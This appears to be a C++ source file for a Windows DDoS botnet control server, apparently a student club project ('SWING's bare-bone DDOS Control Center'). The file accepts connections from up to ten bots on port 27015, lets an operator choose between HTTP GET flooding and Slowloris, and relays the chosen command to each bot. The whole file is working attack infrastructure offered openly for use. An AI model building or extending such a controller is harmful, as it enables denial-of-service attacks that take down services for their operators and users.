/* written by SWING26 hyesong */

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <functional>
#include <thread>
#include <vector>
#include <queue>
#include <mutex>
#include <utility>
#include <winsock2.h>
#pragma comment(lib, "Ws2_32.lib")
using namespace std;

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"
#define MAX_BOTS 10      // if you want more bots then modify here

class ThreadPool {
public:
   ThreadPool(size_t num_threads);
   ~ThreadPool();
   void EnqueueJob(function<void()> job);

private:
   size_t num_threads;
   vector<thread> worker_threads;
   queue<function<void()>> jobs;
   mutex m;
   condition_variable cv;

   bool all_stop;
   void WorkerThread();
};

ThreadPool::ThreadPool(size_t nums) : num_threads(nums), all_stop(false) {      // create thread pool
   worker_threads.reserve(num_threads);
   for (size_t i = 0; i < num_threads; ++i) {
      worker_threads.emplace_back([this]() {this->WorkerThread(); });
   }
}

void ThreadPool::WorkerThread() {      // task - thread assignment
   while (true) {
      unique_lock<mutex> lock(m);
      cv.wait(lock, [this]() {return !this->jobs.empty() || all_stop; });
      if (all_stop && this->jobs.empty()) return;

      function<void()> job = move(jobs.front());
      jobs.pop();
      lock.unlock();

      job();
   }
}

void ThreadPool::EnqueueJob(function<void()> job) {      // append task
   if (all_stop) {
      perror("ThreadPool interrupted");
   }
   unique_lock<mutex> lock(m);
   jobs.push(job);
   cv.notify_one();
}

ThreadPool::~ThreadPool() {
   all_stop = true;
   cv.notify_all();

   for (auto& t : worker_threads)
      t.join();
}

void work(SOCKET sock, char command[]) {      // which thread should do
   char recvbuf[DEFAULT_BUFLEN];
   int buflen = DEFAULT_BUFLEN;

   struct sockaddr_in addr;
   int addr_len;
   addr_len = sizeof(addr);

   SOCKET ClientSock = accept(sock, (struct sockaddr *)&addr, &addr_len);     // bot accepted
   if (ClientSock == INVALID_SOCKET) {
      perror("accept fail");
      closesocket(ClientSock);
      return;
   }

   getpeername(ClientSock, (struct sockaddr *)&addr, &addr_len);
   cout << "bot accepted : " << inet_ntoa(addr.sin_addr) << "\n";

   if (send(ClientSock, command, buflen, 0) == SOCKET_ERROR) {
      perror("send fail");
      closesocket(ClientSock);
      return;
   }

   while (1) {
      memset(recvbuf, 0, buflen);
      if (recv(ClientSock, recvbuf, buflen, 0) > 0)
         cout << recvbuf << "\n";
      else {
         perror("return fail");
         return;
      }
      Sleep(1000);
   }

   closesocket(ClientSock);
}

void InitAndInput(char command[]) {      // print program info & accept command from user

   cout << "SWING's bare-bone DDOS Control Center\n";
   cout << "=============CHOOSE ONE===============\n";
   cout << "ping\nattack\nshut\n";
   cout << "======================================\n";

   while (1) {
      cout << ">> ";
      cin.getline(command, 10);

      if (!strcmp(command, "ping")) break;
      if (!strcmp(command, "attack")) {
         cout << "CHOOSE YOUR WEAPON.\n";
         cout << "1. HTTP Get Flooding\n";
         cout << "2. Slowloris\n";
         cout << ">> ";
         cin.getline(command, 10);
         break;
      }
      if (!strcmp(command, "shut")) break;
      cout << "wrong command. try again\n";
   }
}

int main() {
   WSADATA wsa;
   WSAStartup(MAKEWORD(2, 2), &wsa);

   SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
   sockaddr_in addr;

   if (sock == INVALID_SOCKET) {
      perror("socket error");
      return -1;
   }

   addr.sin_family = AF_INET;
   addr.sin_addr.s_addr = inet_addr("127.0.0.1");           // server ip
   addr.sin_port = htons(atoi(DEFAULT_PORT));               // server port

   if (::bind(sock, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) {
      perror("bind error");
      return -1;
   }

   if (listen(sock, SOMAXCONN) == SOCKET_ERROR) {
      perror("listen error");
      return -1;
   }

   char command[DEFAULT_BUFLEN];
   memset(command, 0, DEFAULT_BUFLEN);

   InitAndInput(command);
   cout << command << " started . . . \n";

   ThreadPool pool(MAX_BOTS);
   
   while (1) {
      pool.EnqueueJob([sock, command]() {work(sock, const_cast<char *> (command)); });
      Sleep(1000);
   }

}
